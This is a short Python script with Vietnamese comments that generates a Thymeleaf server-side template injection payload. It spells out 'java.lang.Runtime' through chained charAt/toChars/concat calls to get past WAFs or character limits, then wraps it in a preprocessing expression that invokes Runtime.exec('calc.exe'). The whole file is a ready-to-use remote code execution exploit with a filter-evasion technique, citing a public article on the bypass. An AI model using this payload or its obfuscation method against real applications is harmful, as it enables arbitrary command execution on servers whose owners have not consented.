# Thymeleaf SSTI Bypass Script trong trường hợp bị limited chars

# Bypass bằng cách sử dụng các hàm nối trong string của java (concat , replace ,charAt)

# 

# https://pulsesecurity.co.nz/articles/EL-Injection-WAF-Bypass

# payload: true.getClass().forName("Java.lang.Runtime").getMethods()[6].invoke(true.getClass().forName("Java.lang.Runtime")).exec('calc.exe')

payload = "java.lang.Runtime"
result = "true.toString().charAt(0).toChars(%d)[0].toString()" % ord(payload[0])
for i in range(1, len(payload)):
    result += ".concat(true.toString().charAt(0).toChars(%d)[0].toString())" % ord(payload[i])

params=f'__${{true.getClass().forName({result}).getMethods()[6].invoke(true.getClass().forName({result})).exec(\'calc.exe\')}}__::.x' 


print(params)